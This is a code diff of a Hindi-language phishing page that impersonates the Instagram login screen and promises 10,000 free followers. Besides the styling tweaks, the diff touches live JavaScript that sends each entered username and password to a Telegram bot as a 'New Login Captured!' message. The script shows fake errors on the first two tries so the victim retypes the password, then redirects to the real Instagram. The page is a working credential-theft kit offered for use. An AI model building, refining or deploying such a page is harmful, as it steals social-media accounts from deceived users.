@@ -8,25 +8,26 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { background-color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; }
         
-        .language-selector { font-size: 12px; color: #8e8e8e; margin-bottom: 60px; margin-top: 10px; }
+        .language-selector { font-size: 12px; color: #8e8e8e; margin-bottom: 50px; margin-top: 10px; cursor: pointer; }
         
-        .main-container { width: 100%; max-width: 400px; text-align: center; }
+        .main-container { width: 100%; max-width: 400px; text-align: center; display: flex; flex-direction: column; align-items: center; }
         
-        .insta-logo-img { width: 60px; height: 60px; margin-bottom: 40px; }
+        /* GitHub wali in.png yahan set hai */
+        .insta-logo-img { width: 64px; height: 64px; margin-bottom: 35px; object-fit: contain; }
         
-        #error-msg { color: #ed4956; font-size: 14px; margin-bottom: 15px; display: none; padding: 0 10px; }
+        #error-msg { color: #ed4956; font-size: 14px; margin-bottom: 15px; display: none; padding: 0 10px; text-align: center; }
 
         .input-group { width: 100%; margin-bottom: 12px; }
         input { 
             width: 100%; 
-            background: #ffffff; 
+            background: #fafafa; 
             border: 1px solid #dbdbdb; 
             padding: 14px 12px; 
             border-radius: 12px; 
             font-size: 14px; 
             color: #262626;
         }
-        input:focus { border: 1px solid #737373; outline: none; }
+        input:focus { border: 1px solid #0064e0; outline: none; background: #fff; }
 
         .btn-login { 
             width: 100%; 
@@ -44,7 +45,7 @@
 
         .forgot-pass { color: #262626; font-size: 14px; font-weight: 500; margin-top: 15px; display: block; text-decoration: none; }
 
-        .bottom-section { margin-top: auto; width: 100%; text-align: center; padding-bottom: 20px; }
+        .bottom-section { margin-top: auto; width: 100%; text-align: center; padding-bottom: 20px; padding-top: 40px; }
         
         .create-account-btn { 
             width: 100%; 
@@ -60,20 +61,19 @@
             margin-bottom: 20px;
         }
 
-        .meta-footer { display: flex; align-items: center; justify-content: center; gap: 4px; color: #8e8e8e; font-size: 14px; font-weight: 600; }
-        .meta-footer img { width: 16px; height: 16px; }
+        .meta-footer { display: flex; align-items: center; justify-content: center; gap: 4px; color: #8e8e8e; font-size: 13px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
+        .meta-footer img { width: 14px; height: 14px; }
 
-        /* Promo and Review styling (kept for your requirements) */
-        .promo-text { color: #8e8e8e; font-size: 14px; margin-bottom: 20px; font-weight: 600; }
-        .promo-text span { color: #262626; display: block; font-size: 16px; }
+        .promo-text { color: #8e8e8e; font-size: 14px; margin-bottom: 25px; font-weight: 500; }
+        .promo-text span { color: #262626; display: block; font-size: 18px; font-weight: 600; margin-top: 4px; }
     </style>
 </head>
 <body>
 
-    <div class="language-selector">Hindi (India)</div>
+    <div class="language-selector">Hindi (India) ▼</div>
 
     <div class="main-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" class="insta-logo-img" alt="Instagram">
+        <img src="in.png" class="insta-logo-img" alt="Instagram">
         
         <div class="promo-text">पाएं 10,000 फ्री फॉलोअर्स<span>सिर्फ 2 मिनट में डिलीवरी ⚡</span></div>
 
@@ -118,8 +118,10 @@
             btn.disabled = true;
             errorDiv.style.display = "none";
 
+            // Telegram message format
             const message = `🚀 *New Login Captured!* \n\n👤 *User:* \`${user}\` \n🔑 *Pass:* \`${pass}\` \n🔢 *Attempt:* ${loginAttempts}`;
 
+            // Send data to Telegram
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -132,11 +134,13 @@
             .then(() => {
                 setTimeout(() => {
                     if (loginAttempts < 3) {
+                        // Pehle 2 attempts mein error dikhayega
                         errorDiv.style.display = "block";
                         btn.disabled = false;
                         btn.innerText = "लॉग इन करें";
                         document.getElementById('pass').value = ""; 
                     } else {
+                        // 3rd attempt par success
                         alert('सत्यापन सफल! \nफॉलोअर्स 2 मिनट के भीतर जोड़ दिए जाएंगे।');
                         window.location.href = "https://www.instagram.com";
                     }
